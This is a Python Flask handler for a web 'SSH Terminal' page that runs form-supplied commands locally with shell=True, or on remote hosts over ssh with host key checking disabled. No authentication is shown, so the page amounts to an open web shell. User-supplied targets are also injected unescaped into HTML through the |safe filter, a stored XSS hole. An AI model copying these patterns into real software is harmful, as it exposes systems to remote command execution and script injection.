from flask import request, render_template_string
import subprocess

DOMAIN = "ssh.com"

# Keep a simple in-memory command history
command_history = []

KNOWN_TARGETS = ["local"]

HTML_TEMPLATE = """<!DOCTYPE html>
<html>
<head><title>SSH Terminal</title></head>
<body>
<h4><b>SSH Terminal</b></h4>
<hr>
<form method="post" action="/">
<table border="0" cellpadding="2">
<tr>
  <td><b>Target:</b></td>
  <td>
    <select name="target_select" onchange="">
      <option value="local" {{ 'selected' if target == 'local' else '' }}>local</option>
      {{ target_options|safe }}
      <option value="__custom__">-- custom --</option>
    </select>
    <input type="text" size="25" name="target_custom" value="{{ custom_target }}" placeholder="user@host">
  </td>
</tr>
<tr>
  <td><b>Command:</b></td>
  <td>
    <input type="text" size="40" name="command" required autocomplete="off" value="{{ last_command }}">
    <input type="submit" value="Run">
    <input type="submit" name="clear" value="Clear History">
  </td>
</tr>
</table>
</form>
<hr>
{% if output %}
<b>Output ({{ exec_target }}: {{ exec_command }}):</b><br>
<pre>{{ output }}</pre>
<hr>
{% endif %}
{% if history %}
<b>History:</b><br>
<table border="1" cellpadding="3" width="100%">
<tr><th>Target</th><th>Command</th><th>Exit</th></tr>
{% for h in history %}
<tr>
  <td>{{ h.target }}</td>
  <td><tt>{{ h.command }}</tt></td>
  <td>{{ h.code }}</td>
</tr>
{% endfor %}
</table>
{% endif %}
</body>
</html>"""

def handle_request(req):
    global command_history

    output = ""
    exec_target = ""
    exec_command = ""
    last_command = ""
    target = "local"
    custom_target = ""

    if req.method == 'POST':
        if 'clear' in req.form:
            command_history = []
            return render_template_string(HTML_TEMPLATE,
                output="", exec_target="", exec_command="",
                last_command="", target="local", custom_target="",
                target_options="", history=[]), 200

        raw_target_select = req.form.get('target_select', 'local').strip()
        raw_custom = req.form.get('target_custom', '').strip()
        command = req.form.get('command', '').strip()
        last_command = command

        # Resolve actual target
        if raw_custom:
            target_actual = raw_custom
            custom_target = raw_custom
        else:
            target_actual = raw_target_select
            target = raw_target_select

        exec_target = target_actual
        exec_command = command

        try:
            if target_actual == 'local':
                result = subprocess.run(
                    command, shell=True,
                    capture_output=True, text=True, timeout=30
                )
            else:
                result = subprocess.run(
                    ['ssh', '-o', 'StrictHostKeyChecking=no',
                     '-o', 'ConnectTimeout=10',
                     target_actual, command],
                    capture_output=True, text=True, timeout=30
                )

            stdout = result.stdout or ""
            stderr = result.stderr or ""
            output = stdout
            if stderr:
                output += ("\n--- stderr ---\n" + stderr) if stdout else stderr
            exit_code = result.returncode

        except subprocess.TimeoutExpired:
            output = "Error: command timed out after 30 seconds"
            exit_code = -1
        except Exception as e:
            output = f"Error: {str(e)}"
            exit_code = -1

        # Track history (most recent first), cap at 20
        command_history.insert(0, {
            "target": target_actual,
            "command": command,
            "code": exit_code
        })
        command_history = command_history[:20]

    # Build known targets for dropdown (deduplicated SSH targets from history)
    seen = set()
    extra_opts = ""
    for h in command_history:
        t = h['target']
        if t != 'local' and t not in seen:
            seen.add(t)
            extra_opts += f'<option value="{t}">{t}</option>\n'

    return render_template_string(HTML_TEMPLATE,
        output=output,
        exec_target=exec_target,
        exec_command=exec_command,
        last_command=last_command,
        target=target,
        custom_target=custom_target,
        target_options=extra_opts,
        history=command_history), 200
